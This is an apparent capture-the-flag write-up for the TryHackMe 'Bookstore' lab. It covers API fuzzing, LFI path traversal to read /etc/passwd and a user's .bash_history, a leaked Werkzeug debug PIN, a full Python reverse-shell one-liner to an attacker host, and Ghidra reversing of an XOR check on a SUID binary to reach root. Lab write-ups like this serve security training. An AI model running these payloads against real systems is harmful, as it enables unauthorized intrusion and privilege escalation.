# Try Hack Me - Bookstore
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 60
# Vulnerabilities: REST api fuzzing, LFI, RCE, Reverse Engineering

# Phase 1 - Reconnaissance:

nmap scan:

```bash
nmap -p- --min-rate=1000 <target_ip>
```
`PORT     STATE SERVICE`

`22/tcp   open  ssh`

`80/tcp   open  http`

`5000/tcp open  upnp`

so lets start enumerating the website at port 80. after some manual searching, i found out that there is a login page at /login.html. i tried sql injections and XSS payloads but it did not work. but i found something interesting in the source code.

so we have just found a possible username named sid. i tried to burteforce the login page but then i realised in the comment it said that the webpage was not even working. so its just a dummy login page which does not accept http POST method. now lets move on to the port 5000. using the -sC and the -sV flags to find out what service is exactly is going on that port.

```bash
nmap -p 5000 -sC -sV <target_ip>
```
`PORT     STATE SERVICE VERSION`

`5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)`

`|_http-server-header: Werkzeug/0.14.1 Python/3.6.9`

`| http-robots.txt: 1 disallowed entry `

`|_/api </p> `

`|_http-title: Home`

we can see there is a robots.txt file present. lets visit it.

after visting the /api endpoint, i could find some other endpoints aswell. the version of the REST api is v2.0 i tried to fuzz the api for the version 2.0 but i failed. considering the assumption that the previous versions would be v1.0. so lets fuzz the /api/v1... endpoint. also make sure that you are fuzzinf at the right place, as our main target will be the /books endpoint since it looks like a possible LFI exploit.

```bash
ffuf -u http://<target_ip>:5000/api/v1/resources/books?FUZZ=test -w /usr/share/wordlists/dirb/common.txt
```

we get a show parameter which throws a 500 status code. this looks interesting, lets test out LFI on this parameter.

```bash
http://<target_ip>:5000/api/v1/resources/books?show=../../../../etc/passwd
```
and just like that we can see that it is vulnerable to LFI. as we know that we had found a hint before which revealed some secret code in the .bash_history of the user sid. lets traverse to that location

```bash
http://<target_ip>:5000/api/v1/resources/books?show=../../../../home/sid/.bash_history
```
now this reveals us a WERKZEUG_DEBUG_PIN. i did not know where to use this pin, so i carried out a directory fuzz on the port 5000 website. 

```bash
gobuster dir -u http://<target_ip>:5000 -w /usr/share/wordlists/dirb/common.txt 
```
api                  (Status: 200) [Size: 825]

console              (Status: 200) [Size: 1985]

robots.txt           (Status: 200) [Size: 45]

lets enter the code in the input field of the /console directory. as we can see, we get a console which interprets python code. this is useful as we can exploit this to get a reverse shell from ![python_reverseshells](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python) . just make sure that you change your attacker ip and port.

```bash
# first setup a netcat listner:
nc -lnvp 4444
```
```bash
# now send the payload to the console:
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
now we have a shell as sid! found no privileges using sudo -l, so for the time beings lets simply submit the user.txt flag. lets find any SUIDs if any. 

```bash
find / -type f -perm -4000 2>/dev/null
```

and we seem to have found a custom SUID in the /home/sid directory. since it is a binary file which requires some user input, lets check whether we can find anything useful in the strings output

```bash
strings /home/sid/try-harder
```
now it is clear that the binary requires a user input which is a Magic Number. on entering it, the system will perform a /bin/bash -p command which will give us a root shell. for understanding how to crack the magic number, we will have to reverse engineer the binary using Ghidra

```bash
# if ghidra is not installed, install it
sudo apt install ghidra
```
```bash
# now simply start the program
ghidra
```
you will have to create a new project first. so just click on `New Project` and name it anything you want. next you will have to click on `Open Project` 

you will see an interface like this. after doing that we will import the binary to the project you just created using the `Import` button. now all you have to do is click on the `Open` button and then Auto-analyse the binary by clicking on the `Analysis` tab. this will automatically decompile the binary for you. now considering the fact that the main program logic would be in the main function, we will visit it and start decoding the code.

```bash
void main(void)

{
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setuid(0);
  local_18 = 0x5db3;
  puts("What\'s The Magic Number?!");
  __isoc99_scanf(&DAT_001008ee,&local_1c);
  local_14 = local_1c ^ 0x1116 ^ local_18;
  if (local_14 == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
now lets take a deep breath and not panic after looking at the C program we have in front of us. i will guide you step by step what is happening here.

`Step 1:` the program initializes a variable local_18 with the hex value 0x5db3. after that the program ask us the question `What is the Magic Number?!`

`Step 2:` the program thentakes user input and stores it in a variable named local_1c. right after that the core logic of the program starts. the ^ operator is the bitwise exclusive OR operator (XOR). so the machine is carrying out XOR between the 
         number we provided (local_1c) and the number 0x1116. and the output of the both numbers is then XOR-ed with the number stored in local_18 i.e 0x5db3. now the final value is stored inside the local_14 variable. 

`Step 3:` the value of the local_14 variable should be equal to 0x5dc21f4 in order to execute the /bin/bash -p command by root. in order to achieve this we have to go backwards since XOR is reversible. we have to provide the appropriate value of 
          local_1c in order to recieve the root shell.

((user_input ^ 0x1116) ^ 0x5db3) = 0x5dcd21f4

now lets reverse the XOR. we will break down the operation into two steps. we will start by isolating the user_input to find out its exact value. 

let local_1c be a, the 0x1116 number be b, local_18 be c and local_14 be d. the logic of the operation is (a^b)c^=d

we know that, a^a = 0 and a^0 = a , following the inverse property of XOR. using this we can simply XOR both sides of the equation by c

(a^b)^c^c = d^c

(a^b)^0 = d^c

a^b = d^c

applying XOR with b on both the sides,

a^b^b = d^c^b

a^0 = d^c^b

a = d^c^b

since XOR is commutative and associative, we can rearrange the expression as a = b^c^d. lets use a python code to calculate the value of the user input.

```bash
local_18=0x5db3
local_14=0x5dcd21f4

magic_number=local_18^local_14^0x1116
print(f"the value of the Magic Number is {magic_number}")
```
save it to a file with the .py extension and run it. it will give you the number in decimal. after entering the number, i got the root shell. we read and submit the root.txt flag.
